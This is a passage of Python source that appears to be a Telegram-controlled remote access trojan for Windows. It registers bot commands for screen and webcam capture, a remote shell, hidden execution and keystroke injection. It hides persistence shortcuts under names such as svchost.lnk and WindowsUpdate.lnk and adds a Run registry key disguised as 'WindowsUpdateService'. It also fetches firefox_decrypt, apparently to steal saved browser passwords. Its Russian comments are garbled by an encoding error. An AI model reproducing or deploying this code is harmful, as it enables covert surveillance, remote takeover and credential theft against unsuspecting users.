    dp.add_handler(CommandHandler("screen", cmd_screen))
    dp.add_handler(CommandHandler("status", cmd_status))
    dp.add_handler(CommandHandler("help", cmd_help))
    dp.add_handler(CommandHandler("webcam", cmd_webcam, pass_args=True))
    dp.add_handler(CommandHandler("archive", cmd_archive, pass_args=True))
    dp.add_handler(CommandHandler("stop", cmd_stop))

    # Register new handlers
    dp.add_handler(CommandHandler("shutdown", cmd_shutdown))
    dp.add_handler(CommandHandler("restart", cmd_restart))
    dp.add_handler(CommandHandler("logout", cmd_logout))
    dp.add_handler(CommandHandler("open_url", cmd_open_url, pass_args=True))
    dp.add_handler(CommandHandler("shell", cmd_shell, pass_args=True))
    dp.add_handler(CommandHandler("run_hidden", cmd_run_hidden, pass_args=True))
    dp.add_handler(CommandHandler("mousemove", cmd_mousemove, pass_args=True))
    dp.add_handler(CommandHandler("mouseclick", cmd_mouseclick))
    dp.add_handler(CommandHandler("type", cmd_type, pass_args=True))
    dp.add_handler(CommandHandler("lock", cmd_lock))
    dp.add_handler(CommandHandler("speak", cmd_speak, pass_args=True))
    dp.add_handler(CommandHandler("popup", cmd_popup, pass_args=True))
    dp.add_handler(CommandHandler("wallpaper", cmd_wallpaper))
    dp.add_handler(CommandHandler("wifi", cmd_wifi))
    dp.add_handler(CommandHandler("ls", cmd_ls, pass_args=True))

    from telegram.ext import MessageHandler, Filters
    dp.add_handler(MessageHandler(Filters.document | Filters.audio | Filters.video, handle_file_upload))


    updater.start_polling()
    updater.idle()

def create_shortcut(target, shortcut_path, args=""):
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target
    shortcut.Arguments = args
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.IconLocation = target
    shortcut.Save()
    # –°–¥–µ–ª–∞—Ç—å —è—Ä–ª—ã–∫ —Å–∫—Ä—ã—Ç—ã–º
    try:
        os.system(f'attrib +h +s "{shortcut_path}"')
    except Exception:
        pass

def setup_multi_autostart():
    script_path = os.path.abspath(sys.argv[0])
    exe_path = sys.executable
    # –ü—É—Ç–∏ –¥–ª—è —è—Ä–ª—ã–∫–æ–≤
    startup_paths = [
        os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup'),
        r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup',
        os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Recent'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Temp'),
    ]
    shortcut_names = ['system32.lnk', 'OneDrive.lnk', 'WindowsUpdate.lnk', 'svchost.lnk']
    for path, name in zip(startup_paths, shortcut_names):
        try:
            os.makedirs(path, exist_ok=True)
            shortcut_path = os.path.join(path, name)
            create_shortcut(exe_path, shortcut_path, f'"{script_path}"')
        except Exception:
            pass
    # –ó–∞–ø–∏—Å—å –≤ —Ä–µ–µ—Å—Ç—Ä –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ (HKCU)
    try:
        reg_path = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        reg_name = 'WindowsUpdateService'
        reg_value = f'"{exe_path}" "{script_path}"'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, reg_value)
    except Exception:
        pass

def ensure_firefox_decrypt():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞–ª–∏—á–∏–µ firefox_decrypt –∏ —Å–∫–∞—á–∏–≤–∞–µ—Ç –µ–≥–æ —Å GitHub, –µ—Å–ª–∏ –æ–Ω –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç."""
    if os.path.exists(FIREFOX_DECRYPT_PATH) and os.path.exists(os.path.join(FIREFOX_DECRYPT_PATH, 'firefox_decrypt.py')):
        return True

    print("[INFO] –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å firefox_decrypt –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–ø—ã—Ç–∫–∞ —Å–∫–∞—á–∞—Ç—å —Å GitHub...")
    
    if os.path.exists(FIREFOX_DECRYPT_PATH):
        try:
            shutil.rmtree(FIREFOX_DECRYPT_PATH)
        except Exception as e:
            print(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –Ω–µ–ø–æ–ª–Ω—É—é –ø–∞–ø–∫—É {FIREFOX_DECRYPT_PATH}: {e}")
            return False

    git_url = "https://github.com/unode/firefox_decrypt.git"
    try:
        subprocess.run(['git', '--version'], check=True, capture_output=True, text=True)
        subprocess.run(
            ['git', 'clone', '--depth', '1', git_url, FIREFOX_DECRYPT_PATH],
            check=True, capture_output=True, text=True
        )
        print(f"[SUCCESS] –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å firefox_decrypt —É—Å–ø–µ—à–Ω–æ —Å–∫–∞—á–∞–Ω–∞ –≤ {FIREFOX_DECRYPT_PATH}")
        return True
    except FileNotFoundError:
        print("[ERROR] –ö–æ–º–∞–Ω–¥–∞ 'git' –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ Git –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –∑–∞–≥—Ä—É–∑–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π.")
        return False
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–∫–∞—á–∞—Ç—å firefox_decrypt —Å –ø–æ–º–æ—â—å—é git: {e.stderr.strip()}")
        return False
    except Exception as e:
        print(f"[ERROR] –ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏ firefox_decrypt: {e}")
        return False

def is_admin():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –∑–∞–ø—É—â–µ–Ω –ª–∏ —Å–∫—Ä–∏–ø—Ç —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ (—Ç–æ–ª—å–∫–æ –¥–ª—è Windows)."""
    if platform.system() != "Windows":
        return True # –ù–∞ –¥—Ä—É–≥–∏—Ö –û–° —Å—á–∏—Ç–∞–µ–º, —á—Ç–æ –ø—Ä–∞–≤–∞ –µ—Å—Ç—å, –∏–ª–∏ —ç—Ç–æ –Ω–µ—Ä–µ–ª–µ–≤–∞–Ω—Ç–Ω–æ.
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

# === –û–°–ù–û–í–ù–û–ô –ó–ê–ü–£–°–ö ===
def main():
    telegram_bot_thread()  # –ó–∞–ø—É—Å–∫ Telegram-–±–æ—Ç–∞ –≤ –≥–ª–∞–≤–Ω–æ–º –ø–æ—Ç–æ–∫–µ

if __name__ == "__main__":
    main() 